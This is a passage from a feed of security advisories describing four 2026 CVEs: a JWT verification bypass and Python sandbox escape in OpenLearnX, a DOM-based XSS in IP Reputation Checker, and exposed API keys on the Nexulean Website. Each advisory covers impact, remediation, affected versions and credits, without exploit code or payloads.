The issue originated from improper enforcement of cryptographic verification during token processing, creating a scenario where attacker-controlled JWTs could be accepted as valid.

The vulnerability was responsibly reported and fully remediated through improvements to the application's authentication and token validation mechanisms.

Technical Description

OpenLearnX uses JSON Web Tokens (JWTs) to maintain authenticated user sessions.

In affected versions, certain authentication paths did not consistently enforce signature verification before processing token contents. As a result, specially crafted tokens could potentially be accepted without validating their authenticity.

Proper JWT implementations must always verify:

  • Token signature integrity.
  • Supported signing algorithms.
  • Token expiration.
  • Issuer and audience claims.

Failure to enforce these checks may allow attackers to manipulate authentication state.

Potential Impact

Successful exploitation could potentially allow:

  • Authentication bypass.
  • Unauthorized account access.
  • Account takeover under affected configurations.
  • Forged session tokens.
  • Unauthorized access to protected application functionality.

The practical impact depends on the application's deployment and authentication configuration.

Remediation

The vulnerability was fully addressed in OpenLearnX v2.0.3 through a comprehensive review and hardening of the authentication subsystem.

JWT Validation Hardening

The token verification workflow was updated to ensure that cryptographic signature validation is always performed before any token claims are processed.

Authentication now strictly rejects tokens that fail verification.

Authentication Flow Review

All authentication paths were audited to ensure consistent security behavior across the application.

Legacy or inconsistent validation logic was removed to prevent bypass scenarios.

Cryptographic Control Improvements

Additional safeguards were implemented around JWT processing to strengthen trust validation and reduce the risk of future authentication weaknesses.

Only expected and properly validated token structures are accepted.

Security Configuration Improvements

Authentication configuration handling was reviewed and updated to prevent insecure verification states from being introduced during deployment.

Additional validation was added to reduce configuration-related security risks.

Defense-in-Depth Enhancements

As part of the remediation effort, several additional security improvements were implemented:

  • Strengthened session validation logic.
  • Improved authentication boundary enforcement.
  • Enhanced validation of token metadata and claims.
  • Reviewed related authentication components for similar issues.
  • Reduced opportunities for improper trust assumptions during token processing.

Codebase Security Audit

A broader security review of the authentication subsystem was conducted to identify and remediate similar weaknesses involving identity validation and session management.

Post-Remediation Verification

Following implementation of the fixes, extensive testing was performed to verify that:

  • Invalid or forged JWTs are properly rejected.
  • Signature verification is consistently enforced.
  • Authentication bypass conditions no longer exist.
  • Updated authentication controls function correctly across all supported workflows.

Users and deployments running affected versions should upgrade to OpenLearnX v2.0.3 or later.

Affected Version

< 2.0.3

Fixed Version

>= 2.0.3

References

  • GitHub Advisory:
    https://github.com/advisories/GHSA-223g-f5mq-gw33
  • OpenLearnX Repository:
    https://github.com/th30d4y/OpenLearnX

Credits

Finder: krrazee

Remediation Developer: 0x5t4l1n

 

Research. Remediate. Reinforce.

items.title: CVE-2026-41900 Remote Code Execution via Sandbox Escape in OpenLearnX
items.summary: Overview CVE-2026-41900 is a high-severity vulnerability affecting the Python execution environment of OpenLearnX. The issue allowed a crafted payload to escape the intended execution sandbox, potentially leading to arbitrary command execution on the underlying host system. The vulnerability originated from insufficient restrictions around the sandbox…
items.content_html:
Overview

CVE-2026-41900 is a high-severity vulnerability affecting the Python execution environment of OpenLearnX. The issue allowed a crafted payload to escape the intended execution sandbox, potentially leading to arbitrary command execution on the underlying host system.

The vulnerability originated from insufficient restrictions around the sandbox environment and inadequate enforcement of security boundaries between user-supplied code and privileged system resources.

The issue was responsibly reported and subsequently remediated through significant improvements to the sandbox architecture and execution controls.

Technical Description

OpenLearnX provides an isolated Python execution environment for interactive learning and code evaluation.

Due to weaknesses in the sandbox implementation, specially crafted Python code could interact with functionality that should have been inaccessible from the restricted environment.

By escaping the intended execution boundary, an attacker could potentially interact with the underlying operating system outside the scope of the sandbox.

Potential Impact

Successful exploitation could potentially allow:

  • Arbitrary command execution.
  • Escape from the restricted execution environment.
  • Access to underlying system resources.
  • Full system compromise depending on deployment configuration.

The overall impact depends on the privileges assigned to the sandbox process.

Remediation

The vulnerability was fully addressed in OpenLearnX v2.0.3 through a comprehensive hardening of the Python execution environment.

Sandbox Hardening

The execution environment was redesigned to enforce stricter isolation between user-supplied code and host system resources.

Additional restrictions were introduced to prevent access to functionality outside the intended sandbox boundary.

Execution Policy Improvements

Validation and filtering mechanisms were strengthened to ensure that only expected and permitted operations can be performed within the execution environment.

Potentially dangerous execution paths were reviewed and restricted.

Privilege Reduction

The sandbox now operates with a more restrictive security model, reducing the impact of potential failures by limiting available permissions and system capabilities.

Access Control Enhancements

Internal access controls were reviewed and updated to better separate trusted application components from user-controlled execution contexts.

Additional verification steps were introduced before sensitive operations are performed.

Defense-in-Depth Measures

Several additional security improvements were implemented as part of the remediation process:

  • Improved sandbox boundary enforcement.
  • Hardened execution environment configuration.
  • Additional validation for user-supplied input.
  • Review and removal of unnecessary privileged functionality.
  • Reduced attack surface within the Python runtime.
  • Security review of related execution components.

Codebase Security Audit

A broader audit of the code execution subsystem was performed to identify and remediate similar issues that could lead to privilege escalation or sandbox bypass.

Post-Remediation Validation

Following implementation of the fixes, extensive testing was conducted to verify that:

  • The sandbox boundary could no longer be bypassed.
  • Previously affected execution paths were properly restricted.
  • User code remained isolated from host system resources.
  • The updated security controls functioned as intended.

Users and deployments running affected versions should upgrade to OpenLearnX v2.0.3 or later.

Affected Version

< 2.0.3

Fixed Version

2.0.3

References

  • GitHub Advisory:
    https://github.com/advisories/GHSA-8h25-q488-4hxw
  • Fix Commit:
    https://github.com/th30d4y/OpenLearnX/commit/14765d7

Credits

Finder: krraze

Coordinators: 0x5t4l1n (Stalin S, harriiinnii (Harini M)

Research. Remediate. Reinforce.

items.title: CVE-2026-41575 DOM-Based Cross-Site Scripting (XSS) in IP Reputation Checker
items.summary: Overview CVE-2026-41575 is a moderate-severity DOM-Based Cross-Site Scripting (XSS) vulnerability affecting the IP Reputation Checker application. The issue originated from insufficient sanitization of user-controlled input before it was inserted into the Document Object Model (DOM). An attacker could craft malicious input containing executable JavaScript, causing…
items.content_html:
Overview

CVE-2026-41575 is a moderate-severity DOM-Based Cross-Site Scripting (XSS) vulnerability affecting the IP Reputation Checker application.

The issue originated from insufficient sanitization of user-controlled input before it was inserted into the Document Object Model (DOM). An attacker could craft malicious input containing executable JavaScript, causing arbitrary script execution within the victim's browser context.

The vulnerability was responsibly reported and subsequently remediated through improvements to input validation and output handling.

Technical Description

The affected application dynamically rendered user-supplied values within the browser without properly escaping or sanitizing potentially dangerous HTML or JavaScript content.

Because the processing occurred entirely on the client side, malicious payloads could execute when the vulnerable component parsed and inserted attacker-controlled data into the DOM.

This behavior could allow attackers to manipulate page content or execute unauthorized JavaScript actions under the security context of the affected application.

Potential Impact

Successful exploitation could potentially allow:

  • Execution of arbitrary JavaScript.
  • Session hijacking.
  • Credential theft.
  • Client-side compromise.
  • DOM manipulation and phishing-style attacks.

The overall impact depends on the privileges and session state of the affected user.

Remediation

The vulnerability was fully addressed in IP Reputation Checker v2.0.1 through several security improvements focused on preventing unsafe client-side rendering.

Implemented Security Fixes

  • Added proper sanitization for all user-controlled input before DOM insertion.
  • Replaced unsafe rendering methods with safer alternatives where applicable.
  • Implemented output encoding for dynamically generated content.
  • Reviewed client-side components for additional DOM injection points.
  • Removed insecure patterns that allowed direct rendering of untrusted data.
  • Improved input validation to reject malformed or potentially dangerous values.
  • Performed a security audit of similar frontend functionality across the application.
  • Added defensive checks to reduce the likelihood of future client-side injection issues.
  • Conducted post-remediation verification to confirm that arbitrary JavaScript execution was no longer possible.

Additional Hardening

As part of the remediation effort, additional defensive measures were introduced to strengthen the application's frontend security posture:

  • Improved overall input handling practices.
  • Reviewed user interaction flows involving dynamic content.
  • Reduced the attack surface for client-side rendering operations.
  • Applied secure development practices for future UI components.

Users should upgrade to v2.0.1 or later to receive these security improvements.

Affected Version

1.0.1

Fixed Version

2.0.1

References

  • GitHub Advisory:
    https://github.com/advisories/GHSA-j7wv-7j97-9qh9

Credits

Reporter: krraze

Coordinators: 0x5t4l1n (Stalin S), harriiinnii (Harini M)

items.title: CVE-2026-32138 API Key Exposure in Nexulean Website
items.summary: Overview CVE-2026-32138 is a high-severity vulnerability affecting the Nexulean Website. The issue resulted from the exposure of Firebase and Web3Forms API credentials through publicly accessible client-side resources. Although certain frontend service identifiers are intended to be public, exposed credentials combined with insufficient restrictions may allow…
items.content_html:
Overview

CVE-2026-32138 is a high-severity vulnerability affecting the Nexulean Website. The issue resulted from the exposure of Firebase and Web3Forms API credentials through publicly accessible client-side resources.

Although certain frontend service identifiers are intended to be public, exposed credentials combined with insufficient restrictions may allow attackers to interact directly with backend services or abuse integrated third-party platforms.

The vulnerability was responsibly reported and subsequently addressed through a comprehensive remediation effort.

Technical Description

The affected version of the application included service credentials within client-side assets that could be retrieved through normal browser interactions.

An attacker inspecting JavaScript bundles or network traffic could obtain these values and attempt to use them outside the intended application workflow.

Potential risks included:

  • Unauthorized interaction with backend services.
  • Abuse of third-party integrations.
  • Automated spam or service misuse.
  • Increased operational costs due to unauthorized API consumption.

Impact

Successful exploitation could potentially allow an attacker to:

  • Interact directly with exposed backend endpoints.
  • Abuse configured third-party services.
  • Generate unauthorized requests using valid application credentials.
  • Increase infrastructure and API usage costs.
  • Attempt unauthorized access against improperly configured resources.

Remediation

The vulnerability was fully addressed in Nexulean Website v2.0.0 through a multi-layered security improvement process designed to eliminate exposed credentials and strengthen overall application security.

Credential Rotation

As an immediate containment measure, all affected Firebase and Web3Forms credentials were revoked and replaced with newly generated keys.

Previously exposed credentials were permanently invalidated to prevent any future unauthorized use.

Configuration Hardening

Application configuration files were reviewed and updated to ensure that sensitive service credentials were no longer unnecessarily exposed.

Only the minimum required client-side configuration values are now included in production builds.

Backend Security Review

A complete audit of backend service permissions was performed.

Security rules and access policies were reviewed and tightened to ensure that possession of a client-side credential alone cannot grant unauthorized access to protected resources.

Third-Party Service Protection

Integrated third-party services were reconfigured to reduce the potential impact of credential leakage.

Additional restrictions and validation checks were implemented wherever supported by the provider.

Source Code Audit

A manual security review of the codebase was conducted to identify other instances of exposed secrets or insecure credential handling practices.

Any redundant or unnecessary embedded credentials were removed.

Secret Management Improvements

Internal development practices were updated to improve secret handling during the build and deployment process.

Sensitive values are now managed separately from application source code whenever possible, reducing the likelihood of future accidental exposure.

Defense-in-Depth Enhancements

Several additional security improvements were implemented as part of the remediation effort:

  • Improved access control validation.
  • Additional server-side verification for sensitive operations.
  • Reduction of the overall exposed attack surface.
  • Review of application dependencies and configuration files.
  • Validation of production deployment settings before release.

Post-Remediation Verification

Following implementation of the fixes, extensive testing was performed to verify that:

  • Previously exposed credentials were no longer valid.
  • Unauthorized requests using old keys were rejected.
  • Backend services enforced the updated security controls.
  • Third-party integrations functioned correctly using the newly issued credentials.

Affected Version

v1.0.0

Fixed Version

v2.0.0

References

  • GitHub Advisory:
    https://github.com/advisories/GHSA-r7cr-5wcx-x9wm
  • Release Notes:
    https://github.com/0x5t4l1n/website/releases/tag/v2.0.0

Credits

Reporter: rootcrypt

Remediation: 0x5t4l1n (w4nn4d13)
